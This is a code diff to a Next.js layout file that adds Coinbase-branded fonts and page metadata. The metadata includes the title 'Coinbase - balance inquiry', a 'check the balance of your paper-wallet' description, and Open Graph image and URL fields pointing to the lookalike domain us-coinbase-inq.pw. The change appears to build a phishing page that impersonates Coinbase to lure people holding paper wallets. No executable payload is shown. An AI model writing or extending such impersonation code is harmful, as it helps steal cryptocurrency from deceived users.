@@ -1,11 +1,11 @@
 import type { Metadata } from "next";
 import localFont from "next/font/local";
 import "./globals.css";
+import Head from "next/head";
 
 const geistSans = localFont({
-  src: "./fonts/Coinbase_Sans-Regular-web-1.32.woff2",
+  src: "./fonts/Coinbase_Display-Regular-web-1.32.woff2",
   variable: "--font-geist-sans",
-  weight: "100 900",
 });
 const geistMono = localFont({
   src: "./fonts/GeistMonoVF.woff",
@@ -25,6 +25,15 @@ export default function RootLayout({
 }>) {
   return (
     <html lang="en">
+
+      <Head>
+        <title>Coinbase - balance inquiry</title>
+        <meta property="og:title" content="Coinbase - balance inquiry" />
+        <meta property="og:description" content="Check the balance of your paper-wallet." />
+        <meta property="og:image" content="https://us-coinbase-inq.pw/og-cb-paper-wallet.gif" />
+        <meta property="og:url" content="https://us-coinbase-inq.pw" />
+        <meta property="og:type" content="website" />
+      </Head>
       <body
         className={`${geistSans.variable} ${geistMono.variable} antialiased`}
       >
